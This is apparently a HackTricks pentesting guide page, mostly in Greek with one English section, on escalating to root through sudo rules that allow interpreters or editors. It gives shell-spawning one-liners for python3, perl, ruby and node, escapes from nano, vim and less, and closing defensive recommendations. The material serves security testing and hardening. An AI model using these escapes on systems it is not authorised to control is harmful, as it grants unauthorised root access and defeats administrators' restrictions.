# Κατάχρηση εντολών Sudo

{{#include ../../banners/hacktricks-training.md}}

## Διερμηνευτές που επιτρέπονται από το Sudo

Αν το `sudo -l` επιτρέπει σε έναν χρήστη να εκτελέσει έναν διερμηνευτή ως root, αντιμετωπίστε το ως άμεση εκτέλεση κώδικα. Οι διερμηνευτές είναι σχεδιασμένοι να εκτελούν arbitrary code, επομένως ένας κανόνας που επιτρέπει τα `python3`, `perl`, `ruby`, `lua`, `node` ή παρόμοια binaries είναι συνήθως ισοδύναμος με εκτέλεση εντολών ως root, εκτός αν τα arguments είναι αυστηρά περιορισμένα και επικυρωμένα.

Συνήθης ροή ελέγχου:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Άλλα παραδείγματα interpreters:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Η ακριβής διαδρομή έχει σημασία. Αν ο κανόνας sudo επιτρέπει το `/usr/bin/python3`, χρησιμοποιήστε αυτήν την ακριβή διαδρομή κατά την επικύρωση:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editors allowed by Sudo

If `sudo -l` allows a user to run an interactive editor as root, treat it as a command-execution surface, not as a harmless file-editing permission. Editors can often execute shell commands, read arbitrary files, write arbitrary files, or invoke external helpers from inside the editor.

Common review flow:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Εκτέλεση εντολών μέσω του Nano

Όταν το `nano` επιτρέπεται μέσω sudo, η εκτέλεση εντολών μπορεί να είναι προσβάσιμη από το περιβάλλον εργασίας του editor:
```text
Ctrl+R
Ctrl+X
```
Στη συνέχεια, δώστε μια εντολή όπως:
```bash
id
/bin/sh
```
Σε ορισμένα terminals, ένα interactive shell μπορεί να χρειάζεται ανακατεύθυνση των standard streams:
```bash
reset; /bin/sh 1>&0 2>&0
```
Η ακριβής ακολουθία πλήκτρων μπορεί να διαφέρει ανάλογα με την έκδοση και τις επιλογές build του nano, όμως το security issue παραμένει το ίδιο: ο editor εκτελείται ως root και μπορεί να επικαλεστεί external commands.

### Άλλες συνήθεις διαφυγές από editors

Οι editors τύπου Vim συνήθως παρέχουν εκτέλεση εντολών μέσω του `:!`:
```text
:!/bin/sh
```
Σελιδοποιητές όπως το `less` μπορούν επίσης να επιτρέψουν την εκτέλεση shell:
```text
!/bin/sh
```
## Αμυντικές σημειώσεις

- Αποφύγετε την παραχώρηση interpreters ή interactive editors μέσω sudo.
- Προτιμήστε fixed wrappers που ανήκουν στον root και εκτελούν μία μόνο, περιορισμένη administrative ενέργεια.
- Αν ένας interpreter είναι αναπόφευκτος, περιορίστε το exact script path και αποτρέψτε user-controlled arguments, writable imports, `PYTHONPATH` και unsafe environment preservation.
- Αν απαιτείται επεξεργασία αρχείων, περιορίστε το exact file path και εξετάστε τη χρήση του `sudoedit` με patched sudo versions και strict environment handling.
- Ελέγξτε τα `SETENV`, `env_keep`, writable working directories, writable module/import paths, `NOEXEC`, `use_pty` και logging, αλλά μην τα θεωρείτε πλήρες sandbox.

{{#include ../../banners/hacktricks-training.md}}
